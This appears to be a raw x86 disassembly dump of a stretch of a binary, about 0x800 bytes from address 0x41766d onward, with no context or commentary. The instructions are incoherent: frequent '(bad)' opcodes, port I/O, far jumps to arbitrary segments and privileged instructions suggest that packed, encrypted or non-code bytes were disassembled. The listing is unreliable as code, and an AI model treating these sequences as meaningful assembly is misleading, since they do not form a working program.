  41766d:	sbb    edx,ebx
  41766f:	mov    al,0x73
  417671:	jmp    0xbde0:0x71c14b44
  417678:	jmp    0x4175fc
  41767a:	add    eax,DWORD PTR [esi]
  41767c:	jmp    0x1a2a:0xd633eb0e
  417683:	mov    al,0x1f
  417685:	ins    DWORD PTR es:[edi],dx
  417686:	out    dx,eax
  417687:	stc    
  417688:	xor    edx,esi
  41768a:	sub    BYTE PTR [ebp+0x4a],0xa1
  41768e:	pop    edx
  41768f:	repnz dec ebp
  417691:	sbb    ah,BYTE PTR [eax+edx*1-0x5c]
  417695:	fadd   DWORD PTR [edi+0x7d]
  417698:	pop    eax
  417699:	arpl   WORD PTR [eax],cx
  41769b:	imul   esi,DWORD PTR [ebp+0x28],0x3c71f4ed
  4176a2:	pop    esi
  4176a3:	rcl    BYTE PTR [esi+0xd],cl
  4176a6:	mov    eax,ds:0xb36fe794
  4176ab:	shl    BYTE PTR [ecx-0x545058ab],cl
  4176b1:	ror    DWORD PTR [eax+0x217e8dfd],0x8e
  4176b8:	fisttp DWORD PTR [ecx-0x41]
  4176bb:	xlat   BYTE PTR ds:[ebx]
  4176bc:	fstp   st(6)
  4176be:	leave  
  4176bf:	add    BYTE PTR [ebx],al
  4176c1:	sbb    BYTE PTR [ebx+ecx*8-0x77],ch
  4176c5:	lahf   
  4176c6:	mov    BYTE PTR [edi],cl
  4176c8:	in     eax,dx
  4176c9:	pop    es
  4176ca:	xchg   ebx,eax
  4176cb:	mul    BYTE PTR [ebp-0x65]
  4176ce:	pop    es
  4176cf:	jmp    0x41766f
  4176d1:	xor    eax,0x82a05df0
  4176d6:	inc    edx
  4176d7:	outs   dx,BYTE PTR ds:[esi]
  4176d8:	and    eax,0xd814d34e
  4176dd:	push   ss
  4176de:	test   dh,dh
  4176e0:	mov    ecx,0xae8fe34b
  4176e5:	mov    dl,0xe1
  4176e7:	and    esi,ebp
  4176e9:	xchg   edx,eax
  4176ea:	mov    ecx,0xebb4faf9
  4176ef:	cld    
  4176f0:	jno    0x417699
  4176f2:	push   eax
  4176f3:	mov    DWORD PTR [ebx-0x3a],esi
  4176f6:	jge    0x41776e
  4176f8:	hlt    
  4176f9:	push   ds
  4176fa:	ins    BYTE PTR es:[edi],dx
  4176fb:	les    esp,FWORD PTR [ebx]
  4176fd:	push   ebp
  4176fe:	push   esi
  4176ff:	pop    edx
  417700:	jle    0x417689
  417702:	mov    ch,0x48
  417704:	pop    ebp
  417705:	jae    0x417737
  417707:	(bad)  
  417708:	test   BYTE PTR [bx+di+0x3e6],bh
  41770d:	fidivr DWORD PTR [eax]
  41770f:	xchg   ebx,eax
  417710:	in     eax,0xa2
  417712:	retf   0x71a5
  417715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417716:	iret   
  417717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417718:	in     eax,0xa
  41771a:	xchg   esi,eax
  41771b:	in     eax,0xd2
  41771d:	pop    edx
  41771e:	fst    DWORD PTR [ebx+0x507d8d14]
  417724:	je     0x417788
  417726:	lahf   
  417727:	outs   dx,BYTE PTR ds:[esi]
  417728:	pusha  
  417729:	push   edx
  41772a:	icebp  
  41772b:	call   DWORD PTR [edi]
  41772d:	repz and edx,esi
  417730:	ret    0xcf60
  417733:	int    0xbe
  417735:	dec    ebp
  417736:	mov    ebx,0xa5a46b3d
  41773b:	jno    0x4176f9
  41773d:	dec    esi
  41773e:	je     0x4176ff
  417740:	adc    DWORD PTR es:[edx],edx
  417743:	popf   
  417744:	aam    0x54
  417746:	cmp    BYTE PTR [edi],dh
  417748:	xor    eax,ebx
  41774a:	test   DWORD PTR [ecx-0x75],edx
  41774d:	and    al,0x44
  41774f:	std    
  417750:	call   0x44adf481
  417755:	rcr    DWORD PTR [ebx+0x39],1
  417758:	add    BYTE PTR [eax],0x21
  41775b:	in     eax,dx
  41775c:	lahf   
  41775d:	repnz dec eax
  41775f:	mov    dl,0xb2
  417761:	mov    dl,0xbe
  417763:	ja     0x41777d
  417765:	add    al,0x3b
  417767:	sbb    esp,DWORD PTR [ecx+0x3e]
  41776a:	mov    ebx,edx
  41776c:	mov    edi,0x1ebaefd0
  417771:	es and eax,0xf72aae54
  417777:	xchg   esp,eax
  417778:	sahf   
  417779:	das    
  41777a:	pop    es
  41777b:	pop    edi
  41777c:	push   0x8f63218b
  417781:	mov    eax,ds:0x58993027
  417786:	push   ds
  417787:	push   ss
  417788:	push   es
  417789:	mov    ?,WORD PTR [edi+0x1920de45]
  41778f:	aaa    
  417790:	je     0x4177f3
  417792:	std    
  417793:	and    dh,BYTE PTR [edi-0x78]
  417796:	push   esp
  417797:	and    al,0x1
  417799:	popa   
  41779a:	adc    al,0x7b
  41779c:	jmp    0x924b:0x1185f86d
  4177a3:	jno    0x417820
  4177a5:	sbb    edi,eax
  4177a7:	(bad)  
  4177a9:	dec    edi
  4177aa:	xchg   DWORD PTR [esi+0x2e],esi
  4177ad:	mov    bh,0x41
  4177af:	sbb    bl,BYTE PTR [eax-0x38e3c0b0]
  4177b5:	jl     0x4177f6
  4177b7:	test   al,0x70
  4177b9:	jge    0x4177d7
  4177bb:	fstp   TBYTE PTR [esi+0x3ccf0ff8]
  4177c1:	fwait
  4177c2:	cdq    
  4177c3:	and    BYTE PTR [edx],0x74
  4177c6:	jl     0x417753
  4177c8:	ror    eax,0xc0
  4177cb:	lock stos DWORD PTR es:[edi],eax
  4177cd:	scas   al,BYTE PTR es:[edi]
  4177ce:	jle    0x41779f
  4177d0:	mov    eax,ds:0x63d9e952
  4177d5:	sub    bl,BYTE PTR [edx]
  4177d7:	lock mov WORD PTR [ecx-0x7f1c798c],ds
  4177de:	mov    al,ds:0xa6ec8308
  4177e3:	jnp    0x4177bc
  4177e5:	push   ss
  4177e6:	push   ebx
  4177e7:	lds    edx,FWORD PTR ds:0xf6d13c14
  4177ed:	cld    
  4177ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ef:	aam    0xa2
  4177f1:	jo     0x417848
  4177f3:	or     al,0x24
  4177f5:	ds out dx,eax
  4177f7:	jnp    0x41781a
  4177f9:	mov    ds:0xe56897b0,al
  4177fe:	cdq    
  4177ff:	mov    es,WORD PTR [ecx+0x6464a376]
  417805:	xor    bh,dh
  417807:	jge    0x4177f1
  417809:	mov    esi,0x336ad16e
  41780e:	in     al,dx
  41780f:	jns    0x417808
  417811:	outs   dx,BYTE PTR ds:[esi]
  417812:	popf   
  417813:	mov    ds:0xb78cd16,al
  417818:	pop    ebx
  417819:	sbb    esp,DWORD PTR [esi-0x30]
  41781c:	fnstenv [eax-0x4108990c]
  417822:	(bad)  
  417823:	jecxz  0x4177a5
  417825:	(bad)  
  417826:	scas   al,BYTE PTR es:[edi]
  417827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417828:	mov    cl,0x22
  41782a:	fisttp DWORD PTR [esi+0x6f8f6481]
  417830:	mov    bl,0xd6
  417832:	jmp    0x4177e7
  417834:	loope  0x417817
  417836:	test   al,0xd5
  417838:	mov    ecx,ebx
  41783a:	sbb    esi,ebx
  41783c:	jnp    0x41787c
  41783e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783f:	sahf   
  417840:	or     BYTE PTR [ebx],dh
  417842:	mov    cl,0x33
  417844:	mov    WORD PTR [edi+0x36],fs
  417847:	shl    cl,0xb3
  41784a:	jns    0x4178ad
  41784c:	jae    0x417862
  41784e:	int3   
  41784f:	jge    0x4177e7
  417851:	adc    dh,BYTE PTR [ecx-0x78851ca6]
  417857:	neg    DWORD PTR [eax-0x4276caae]
  41785d:	cmp    al,0xe5
  41785f:	out    0x7b,eax
  417861:	fisubr WORD PTR [eax+0x2f810b3c]
  417867:	xchg   ecx,eax
  417868:	jae    0x417874
  41786a:	aaa    
  41786b:	js     0x4178b5
  41786d:	ss stc 
  41786f:	daa    
  417870:	ss mov edx,0xb03637c4
  417876:	out    dx,al
  417877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417878:	(bad)  
  417879:	jp     0x41789b
  41787b:	and    ah,BYTE PTR [edx-0x72e61e2]
  417881:	aaa    
  417882:	fsub   QWORD PTR [ebx]
  417884:	loop   0x41786e
  417886:	xchg   edx,eax
  417887:	sbb    DWORD PTR [esi-0x46156d0e],esi
  41788d:	ja     0x41790d
  41788f:	dec    ebp
  417890:	(bad)  
  417892:	int3   
  417893:	fimul  DWORD PTR [edx+0xb]
  417896:	inc    ecx
  417897:	add    DWORD PTR [eax+edx*8],0xffffff8a
  41789b:	sbb    BYTE PTR [edi-0x6422259e],ch
  4178a1:	daa    
  4178a2:	and    eax,0x425d0837
  4178a7:	jecxz  0x4178bd
  4178a9:	cmp    dh,BYTE PTR [ebp+ecx*1+0x72152cb4]
  4178b0:	dec    esp
  4178b1:	fwait
  4178b2:	mov    bh,0xc4
  4178b4:	mov    eax,ds:0xd0e5bd27
  4178b9:	aad    0x82
  4178bb:	ins    DWORD PTR es:[edi],dx
  4178bc:	mov    ch,0x77
  4178be:	lds    esi,FWORD PTR [ebx]
  4178c0:	les    edi,FWORD PTR [esi]
  4178c2:	mov    esi,0x496994b9
  4178c7:	les    eax,FWORD PTR [ebx-0xf124238]
  4178cd:	faddp  st(5),st
  4178cf:	push   ds
  4178d0:	or     cl,ch
  4178d2:	push   ds
  4178d3:	out    dx,al
  4178d4:	push   eax
  4178d5:	ja     0x417861
  4178d7:	call   0x53d2:0x6e9c2f20
  4178de:	add    eax,0x6c1dcd7d
  4178e3:	jmp    0xdad8f6f7
  4178e8:	gs popf 
  4178ea:	xor    DWORD PTR [esi+0x2cdc1809],ebx
  4178f0:	jp     0x417936
  4178f2:	add    eax,0x418edcef
  4178f7:	inc    ebx
  4178f8:	cmpxchg ch,al
  4178fb:	cmp    BYTE PTR [esi+0x6c7e7edb],al
  417901:	gs dec ecx
  417903:	adc    esi,DWORD PTR [esi+0x2ed37dde]
  417909:	or     al,0xa2
  41790b:	shl    DWORD PTR [eax+0xec501c],0x53
  417912:	je     0x417925
  417914:	xor    dh,BYTE PTR [eax+edi*1+0x41a8af55]
  41791b:	pop    edi
  41791c:	dec    esi
  41791d:	(bad)  
  41791e:	hlt    
  41791f:	dec    esi
  417920:	pusha  
  417921:	daa    
  417922:	push   edx
  417923:	cmp    eax,esi
  417925:	push   0xfffffffd
  417927:	aam    0xa8
  417929:	or     eax,0xb9ffc9eb
  41792e:	pushf  
  41792f:	cmp    eax,0xccf57c03
  417934:	dec    ebx
  417935:	stos   DWORD PTR es:[edi],eax
  417936:	xchg   ebp,eax
  417937:	neg    BYTE PTR [edi-0x45]
  41793a:	jno    0x4178ea
  41793c:	sti    
  41793d:	sub    al,BYTE PTR [esi]
  41793f:	test   DWORD PTR es:[ecx+0x5f],edi
  417943:	ins    DWORD PTR es:[edi],dx
  417944:	pop    ds
  417945:	mov    ecx,0x3d4868b9
  41794a:	call   0x85347b3c
  41794f:	aad    0x20
  417951:	rcr    BYTE PTR [edi+ebp*8],cl
  417954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417955:	jo     0x417901
  417957:	push   esi
  417958:	(bad)  
  41795a:	fisubr WORD PTR [esi+0x5e551a2a]
  417960:	bound  edx,QWORD PTR [bp+si]
  417963:	pop    ds
  417964:	std    
  417965:	shl    BYTE PTR [ecx-0x2793e47e],0xeb
  41796c:	and    esi,ebp
  41796e:	std    
  41796f:	shl    BYTE PTR [ecx-0x633a98ff],0x13
  417976:	addr16 adc al,0xdd
  417979:	and    DWORD PTR [ecx+0x7c6b9776],ebx
  41797f:	pop    edx
  417980:	pop    ebx
  417981:	fld    st(5)
  417983:	repz jge 0x417924
  417986:	pop    eax
  417987:	loopne 0x4179d1
  417989:	stos   BYTE PTR es:[edi],al
  41798a:	out    dx,al
  41798b:	xor    DWORD PTR ds:0x78b7a625,ecx
  417991:	(bad)  
  417992:	rol    DWORD PTR [edi-0x5a21837c],1
  417998:	cmp    edx,DWORD PTR [ecx]
  41799a:	shl    DWORD PTR [eax],1
  41799c:	out    dx,al
  41799d:	mov    eax,ds:0xce556bac
  4179a2:	enter  0x5fa3,0x56
  4179a6:	add    eax,0x244b91e8
  4179ab:	jne    0x41794b
  4179ad:	add    eax,ebp
  4179af:	fisttp WORD PTR [ebx+0x1e59900e]
  4179b5:	ins    BYTE PTR es:[edi],dx
  4179b6:	fwait
  4179b7:	es cld 
  4179b9:	cmp    DWORD PTR [ebx-0x15137af4],esi
  4179bf:	jle    0x417995
  4179c1:	mov    ?,WORD PTR [ebp+eax*8-0x43]
  4179c5:	pop    esi
  4179c6:	jnp    0x4179ac
  4179c8:	mov    DWORD PTR [ecx+0x6],eax
  4179cb:	adc    al,0xa4
  4179cd:	out    dx,eax
  4179ce:	push   ds
  4179cf:	xor    ah,cl
  4179d1:	xor    DWORD PTR [esi-0x38],0xda1ecd60
  4179d8:	enter  0x16e1,0xe5
  4179dc:	mov    cl,BYTE PTR [ecx-0x1d989c98]
  4179e2:	push   0xfffffff2
  4179e4:	add    al,0x9
  4179e6:	cmp    al,0x13
  4179e8:	jge    0x417a39
  4179ea:	sub    al,0xb6
  4179ec:	xor    edi,ecx
  4179ee:	cs pop esi
  4179f0:	mov    ecx,0xd876b17f
  4179f5:	loop   0x417a71
  4179f7:	sub    al,0x5b
  4179f9:	in     eax,dx
  4179fa:	cmp    bh,BYTE PTR [esi+0x43]
  4179fd:	icebp  
  4179fe:	in     eax,dx
  4179ff:	and    BYTE PTR [edi],dl
  417a01:	sbb    eax,0x7f50db4e
  417a06:	jecxz  0x4179d7
  417a08:	mov    cl,0x66
  417a0a:	test   al,0xaf
  417a0c:	inc    eax
  417a0d:	je     0x417a84
  417a0f:	loope  0x4179d0
  417a11:	inc    ebx
  417a12:	xchg   ecx,eax
  417a13:	repnz xchg ebp,eax
  417a15:	cld    
  417a16:	loopne 0x4179b6
  417a18:	dec    ebp
  417a19:	xlat   BYTE PTR ds:[ebx]
  417a1a:	add    ebp,esp
  417a1c:	sbb    eax,0x29ed176f
  417a21:	add    eax,0x1eabd2ca
  417a26:	and    BYTE PTR [edx-0x61],ah
  417a29:	call   0xd303:0x671713
  417a30:	dec    esi
  417a31:	inc    edi
  417a32:	mov    ebx,0xee291f95
  417a37:	sbb    BYTE PTR [eax-0x4a],dh
  417a3a:	mov    dh,0xc3
  417a3c:	lock push eax
  417a3e:	(bad)  
  417a40:	xchg   esi,eax
  417a41:	xor    eax,0x73a530d
  417a46:	sub    dl,dh
  417a48:	and    DWORD PTR [esi],ecx
  417a4a:	ret    0x6b7
  417a4d:	pop    ebx
  417a4e:	cmp    al,0x9
  417a50:	aas    
  417a51:	mov    esi,0x6fc0cffb
  417a56:	out    0x15,al
  417a58:	jae    0x417a56
  417a5a:	test   al,0x33
  417a5c:	stos   BYTE PTR es:[edi],al
  417a5d:	xchg   ebx,eax
  417a5e:	lahf   
  417a5f:	jae    0x417a6f
  417a61:	push   esi
  417a62:	jmp    0x417a2c
  417a64:	sub    eax,0xcd3723b7
  417a69:	scas   eax,DWORD PTR es:[edi]
  417a6a:	xchg   esi,eax
  417a6b:	repnz or eax,0x8b6b9196
  417a71:	mov    ds:0xbf1566ad,eax
  417a76:	mov    dh,0xd9
  417a78:	sbb    ebp,esp
  417a7a:	fs lahf 
  417a7c:	data16 ss cli 
  417a7f:	mov    fs,WORD PTR [edi+0x7d767232]
  417a85:	fisttp DWORD PTR [eax-0x4c]
  417a88:	sub    cl,BYTE PTR [esi-0x41b5454c]
  417a8e:	push   0x4a
  417a90:	lahf   
  417a91:	in     eax,0x7
  417a93:	loop   0x417a3f
  417a95:	cwde   
  417a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a97:	or     BYTE PTR [esp+eax*4-0x52fdcc4f],bh
  417a9e:	jae    0x417ad5
  417aa0:	add    al,0x43
  417aa2:	or     al,0x57
  417aa4:	iret   
  417aa5:	and    al,0x5f
  417aa7:	dec    ebp
  417aa8:	xchg   ebx,eax
  417aa9:	adc    eax,0x1af557ab
  417aae:	call   0x8107:0xaf336715
  417ab5:	pop    ebx
  417ab6:	and    al,bh
  417ab8:	add    BYTE PTR [ebp+0x62539c66],0x60
  417abf:	ret    
  417ac0:	push   ebp
  417ac1:	outs   dx,BYTE PTR ds:[esi]
  417ac2:	mov    BYTE PTR [eax+0x2485dc7],dh
  417ac8:	mov    eax,ds:0x8f115b9
  417acd:	xor    edx,edi
  417acf:	pushf  
  417ad0:	jae    0x417b37
  417ad2:	test   DWORD PTR [esi],0xd84331ce
  417ad8:	add    BYTE PTR [eax],ch
  417ada:	pop    esi
  417adb:	mov    edi,0xf0ed6130
  417ae0:	int3   
  417ae1:	mov    cl,0xce
  417ae3:	ds mov al,0xc3
  417ae6:	scas   al,BYTE PTR es:[edi]
  417ae7:	pop    ebp
  417ae8:	or     al,0x9
  417aea:	add    ebx,DWORD PTR [edx]
  417aec:	mov    ds:0xa1ba2345,eax
  417af1:	das    
  417af2:	and    dl,bh
  417af4:	ret    0x3074
  417af7:	ror    DWORD PTR ds:0xa06a437e,cl
  417afd:	mov    dh,0xed
  417aff:	fistp  QWORD PTR [ebx-0x46714d38]
  417b05:	mov    ds:0xa75408ea,al
  417b0a:	cld    
  417b0b:	icebp  
  417b0c:	mov    dh,0xd6
  417b0e:	out    dx,al
  417b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b10:	ret    
  417b11:	sub    DWORD PTR [edi],0xbaede534
  417b17:	adc    eax,0x7f6f37ee
  417b1c:	cmc    
  417b1d:	cmp    eax,0x216556a
  417b22:	pop    ds
  417b23:	jns    0x417b06
  417b25:	cdq    
  417b26:	pop    edi
  417b27:	iret   
  417b28:	out    dx,al
  417b29:	and    ebx,DWORD PTR [edx+0x7da0da66]
  417b2f:	xchg   edi,edi
  417b31:	add    esi,DWORD PTR [ebx]
  417b33:	jp     0x417ab9
  417b35:	jle    0x417ac1
  417b37:	xchg   edx,eax
  417b38:	lahf   
  417b39:	(bad)  
  417b3a:	out    0x44,eax
  417b3c:	push   ss
  417b3d:	mov    dh,0xbb
  417b3f:	fadd   DWORD PTR [eax+0x7b]
  417b42:	data16 into 
  417b44:	xor    bl,ah
  417b46:	jmp    0x8b9f:0x98ad283f
  417b4d:	mov    dh,0x13
  417b4f:	std    
  417b50:	push   es
  417b51:	lods   al,BYTE PTR ds:[esi]
  417b52:	cmp    al,0x3d
  417b54:	and    BYTE PTR [ebp-0x49],0xc
  417b58:	inc    esp
  417b59:	in     al,0xd1
  417b5b:	add    ch,0xf4
  417b5e:	mov    dh,0x1d
  417b60:	cld    
  417b61:	or     DWORD PTR [eax],0x43
  417b64:	sbb    ebp,DWORD PTR [edx]
  417b66:	xchg   ebx,eax
  417b67:	loop   0x417ae9
  417b69:	mov    edx,0xfd6c862f
  417b6e:	pop    es
  417b6f:	push   esi
  417b70:	mov    DWORD PTR [ebx+edi*8],esp
  417b73:	and    BYTE PTR [ebx-0x33],bl
  417b76:	jo     0x417b5f
  417b78:	dec    edx
  417b79:	test   DWORD PTR [esi-0x5e8425e8],ebp
  417b7f:	shl    edx,cl
  417b81:	sbb    BYTE PTR [eax+0x6],ch
  417b84:	ins    DWORD PTR es:[edi],dx
  417b85:	cwde   
  417b86:	dec    esp
  417b87:	aad    0x76
  417b89:	push   eax
  417b8a:	cmp    BYTE PTR [ebx],bh
  417b8c:	jmp    0x417c04
  417b8e:	in     eax,0x9f
  417b90:	push   ebp
  417b91:	adc    cl,bh
  417b93:	push   es
  417b94:	js     0x417b5f
  417b96:	push   eax
  417b97:	bound  edi,QWORD PTR [ebp+0x30]
  417b9a:	dec    esp
  417b9b:	aaa    
  417b9c:	add    DWORD PTR [edi-0x43],ecx
  417b9f:	add    dh,ch
  417ba1:	xor    DWORD PTR [ecx+0x3c],edx
  417ba4:	pop    es
  417ba5:	daa    
  417ba6:	pop    ss
  417ba7:	enter  0xb6cb,0x71
  417bab:	sbb    ecx,DWORD PTR [eax+0x58617eaf]
  417bb1:	stos   DWORD PTR es:[edi],eax
  417bb2:	fdivr  DWORD PTR [ebx+0x58]
  417bb5:	pusha  
  417bb6:	ror    BYTE PTR [edx-0x72a47ef5],1
  417bbc:	mov    ds:0x6c05e9b1,eax
  417bc1:	dec    DWORD PTR [eax-0x6d]
  417bc4:	push   es
  417bc5:	pop    esi
  417bc6:	out    dx,al
  417bc7:	lahf   
  417bc8:	jo     0x417b5a
  417bca:	inc    ebx
  417bcb:	adc    dh,ch
  417bcd:	mov    ecx,0xc50638c0
  417bd2:	add    al,0x6d
  417bd4:	push   0x47
  417bd6:	shl    al,cl
  417bd8:	pop    esp
  417bd9:	inc    ebp
  417bda:	sar    DWORD PTR [edx+ecx*4-0x63],0x5e
  417bdf:	lea    esp,[eax-0x3e]
  417be2:	in     eax,dx
  417be3:	test   DWORD PTR [ebx-0x35ad1dc6],ecx
  417be9:	pop    edx
  417bea:	sti    
  417beb:	leave  
  417bec:	pop    ebx
  417bed:	in     al,0xed
  417bef:	xor    dl,BYTE PTR [edx+eiz*2+0x48]
  417bf3:	mov    WORD PTR [eax+0x692c0f08],?
  417bf9:	sbb    ebx,edi
  417bfb:	jmp    0x1943:0xa4c88f11
  417c02:	int    0xb5
  417c04:	test   al,0x82
  417c06:	in     eax,dx
  417c07:	or     ah,cl
  417c09:	pusha  
  417c0a:	or     BYTE PTR fs:[eax-0x1a9ed2a3],ah
  417c11:	stos   BYTE PTR es:[edi],al
  417c12:	add    BYTE PTR [edi+0x69fb6b40],dh
  417c18:	mov    ebp,0x5f93f92a
  417c1d:	xchg   ebx,eax
  417c1e:	das    
  417c1f:	dec    ebp
  417c20:	cdq    
  417c21:	in     eax,0x20
  417c23:	ss mov ecx,0xbdf9d3b0
  417c29:	mov    eax,fs
  417c2b:	or     BYTE PTR [eax+0x67],bh
  417c2e:	(bad)  
  417c2f:	jg     0x417c4e
  417c31:	mov    ecx,0x99e098d5
  417c36:	(bad)  
  417c37:	in     eax,dx
  417c38:	sbb    al,BYTE PTR [edi+0x5cc86495]
  417c3e:	jp     0x417c33
  417c40:	xchg   ebx,eax
  417c41:	(bad)  [ecx+0x25]
  417c44:	xchg   esp,eax
  417c45:	ror    DWORD PTR [ecx],0xa0
  417c48:	ret    0x40d7
  417c4b:	test   DWORD PTR [ebx+0x73],esp
  417c4e:	in     al,dx
  417c4f:	cwde   
  417c50:	ins    BYTE PTR es:[edi],dx
  417c51:	cdq    
  417c52:	dec    eax
  417c53:	mov    al,ds:0xf1a60382
  417c58:	mov    cl,0x48
  417c5a:	mov    edi,0xbddaaff7
  417c5f:	ins    BYTE PTR es:[edi],dx
  417c60:	mov    ebx,0xc23d0620
  417c65:	scas   al,BYTE PTR es:[edi]
  417c66:	dec    eax
  417c67:	call   0xdf2ab490
  417c6c:	loope  0x417bf9
  417c6e:	xor    al,0x53
  417c70:	jne    0x417c3e
  417c72:	bound  ecx,QWORD PTR [ebp+0x15]
  417c75:	push   cs
  417c76:	dec    esp
  417c77:	add    ebp,DWORD PTR ds:0x317a689b
  417c7d:	call   0xfd70:0x5aff0a65
  417c84:	and    esi,DWORD PTR [eax]
  417c86:	mov    al,ds:0x99a6b64e
  417c8b:	mov    ebx,0xa5080e73
  417c90:	mov    eax,0xfd1c4123
  417c95:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417c97:	dec    edi
  417c98:	or     dh,bh
  417c9a:	adc    eax,edi
  417c9c:	psrlw  mm2,QWORD PTR [esi]
  417c9f:	mov    cl,0xd0
  417ca1:	or     bl,ah
  417ca3:	sub    ch,ah
  417ca5:	adc    ebp,ecx
  417ca7:	ins    BYTE PTR es:[edi],dx
  417ca8:	lods   eax,DWORD PTR ds:[esi]
  417ca9:	inc    BYTE PTR [edi+0x9]
  417cac:	mov    bl,0xd2
  417cae:	pushf  
  417caf:	ss js  0x417c3b
  417cb2:	stc    
  417cb3:	add    al,0xf
  417cb5:	ins    DWORD PTR es:[edi],dx
  417cb6:	scas   al,BYTE PTR es:[edi]
  417cb7:	aad    0x4b
  417cb9:	ins    BYTE PTR es:[edi],dx
  417cba:	or     cl,bl
  417cbc:	push   cs
  417cbd:	mov    ch,0x82
  417cbf:	das    
  417cc0:	cvtdq2ps xmm0,XMMWORD PTR [ebx]
  417cc3:	sub    BYTE PTR es:[ecx],0x5f
  417cc7:	push   ds
  417cc8:	mov    esi,0xf61e635b
  417ccd:	leave  
  417cce:	mov    ebx,0x1b16f60a
  417cd3:	add    bh,BYTE PTR [esi-0x4f]
  417cd6:	jns    0x417cff
  417cd8:	push   ecx
  417cd9:	pop    edx
  417cda:	inc    ebx
  417cdb:	xchg   ecx,eax
  417cdc:	dec    ebx
  417cdd:	ret    
  417cde:	ret    
  417cdf:	inc    esi
  417ce0:	jno    0x417d51
  417ce2:	sbb    bh,BYTE PTR ds:0x7f461eb4
  417ce8:	jno    0x417c6f
  417cea:	mov    ah,bh
  417cec:	add    al,0xcb
  417cee:	neg    DWORD PTR [eax-0x48]
  417cf1:	cld    
  417cf2:	cwde   
  417cf3:	mov    ch,0xa0
  417cf5:	shr    cl,cl
  417cf7:	xor    al,0x91
  417cf9:	das    
  417cfa:	leave  
  417cfb:	mov    ecx,0xcefdfcab
  417d00:	or     ah,cl
  417d02:	sbb    BYTE PTR [edi+0x2d1202bb],0x59
  417d09:	mov    al,ds:0xbc42131f
  417d0e:	mov    esi,0xc8f61147
  417d13:	lea    ecx,[ecx]
  417d15:	push   0x7d
  417d17:	and    dh,cl
  417d19:	sub    eax,0x72f17391
  417d1e:	mov    cl,0x38
  417d20:	sbb    al,0xec
  417d22:	mov    WORD PTR [eax+edx*2-0x7a],ss
  417d26:	lea    esp,[ebx-0x67166f9e]
  417d2c:	in     al,dx
  417d2d:	hlt    
  417d2e:	stc    
  417d2f:	pop    edx
  417d30:	sub    bl,bl
  417d32:	mov    al,ds:0x7edf4df1
  417d37:	mov    dl,0xeb
  417d39:	repnz rcr WORD PTR [ebx],cl
  417d3d:	out    dx,al
  417d3e:	jno    0x417d67
  417d40:	sbb    eax,0x52b7e4a6
  417d45:	ins    DWORD PTR es:[edi],dx
  417d46:	stos   DWORD PTR es:[edi],eax
  417d47:	aam    0x82
  417d49:	in     eax,dx
  417d4a:	add    ebp,esp
  417d4c:	cmp    BYTE PTR [ebp+eax*8+0x39],ah
  417d50:	cld    
  417d51:	in     al,dx
  417d52:	mov    WORD PTR [esi+0x3a75d4db],fs
  417d58:	pop    ss
  417d59:	nop
  417d5a:	cmp    al,ah
  417d5c:	jne    0x417d0a
  417d5e:	dec    edx
  417d5f:	(bad)  
  417d60:	sti    
  417d61:	sar    BYTE PTR [ebx-0x5b11b74],cl
  417d67:	and    al,0x8c
  417d69:	inc    eax
  417d6a:	dec    ecx
  417d6b:	mov    ds:0x67ece2d9,al
  417d70:	add    bl,BYTE PTR [esi-0x68]
  417d73:	cmp    al,0xf3
  417d75:	xor    BYTE PTR [esi],al
  417d77:	rcr    DWORD PTR [ebx+0x5408f3b2],1
  417d7d:	mov    dl,dh
  417d7f:	call   0xbcde:0x510edcab
  417d86:	mov    bh,0xcd
  417d88:	mov    esp,0x57224e79
  417d8d:	push   edx
  417d8e:	jge    0x417d55
  417d90:	ja     0x417da4
  417d92:	and    DWORD PTR [edi-0x53ddb316],ecx
  417d98:	out    dx,eax
  417d99:	fcomp  DWORD PTR [edi+0x11]
  417d9c:	mov    ah,0x65
  417d9e:	mov    edx,0x4839d3b2
  417da3:	gs pop ds
  417da5:	pop    edi
  417da6:	dec    eax
  417da7:	neg    DWORD PTR [ebx+0x7c]
  417daa:	and    dh,al
  417dac:	xor    DWORD PTR [ecx],esi
  417dae:	jns    0x417db5
  417db0:	or     al,0x2b
  417db2:	dec    esp
  417db3:	out    0xd5,al
  417db5:	inc    edx
  417db6:	stos   BYTE PTR es:[edi],al
  417db7:	das    
  417db8:	inc    esi
  417db9:	push   eax
  417dba:	sub    dl,BYTE PTR [edi+0x7417a35a]
  417dc0:	sub    DWORD PTR [ebx+ebx*1+0x36],eax
  417dc4:	mov    ebp,0x96c94acb
  417dc9:	sbb    ah,BYTE PTR [esi-0x73]
  417dcc:	mov    ds:0x46cd97ea,eax
  417dd1:	fst    QWORD PTR [ebx+0x177d46b0]
  417dd7:	fbstp  TBYTE PTR [ebx+0xb]
  417dda:	mov    ds,eax
  417ddc:	add    DWORD PTR [ebx+0x56],esp
  417ddf:	ret    0x5a99
  417de2:	aam    0xc2
  417de4:	inc    ebp
  417de5:	mov    ds:0x965e6b1d,al
  417dea:	adc    eax,0x473484a5
  417def:	and    eax,0x31ed0ac0
  417df4:	lock mov esp,0x997651fb
  417dfa:	mov    WORD PTR [ecx],?
  417dfc:	adc    esi,DWORD PTR [esi-0x26550d2e]
  417e02:	jle    0x417ddc
  417e04:	sti    
  417e05:	shr    DWORD PTR [eax-0x688a1cc0],0x28
  417e0c:	and    esp,edi
  417e0e:	in     eax,0x2f
  417e10:	jmp    0x4ccde627
  417e15:	push   eax
  417e16:	xor    DWORD PTR [ecx+0xa6d1171],esi
  417e1c:	int3   
  417e1d:	mov    al,ds:0x15b85148
  417e22:	or     esp,DWORD PTR [ecx-0x5f]
  417e25:	lea    esp,[esi]
  417e27:	inc    ebp
  417e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e29:	rol    DWORD PTR [ebp+0x20],cl
  417e2c:	add    eax,DWORD PTR [eax+0x3f]
  417e2f:	mov    al,0x66
  417e31:	lods   al,BYTE PTR ds:[esi]
  417e32:	push   edx
  417e33:	les    ecx,FWORD PTR [edi]
  417e35:	or     al,0xbd
  417e37:	add    DWORD PTR [ebx],0xe2d094d4
  417e3d:	das    
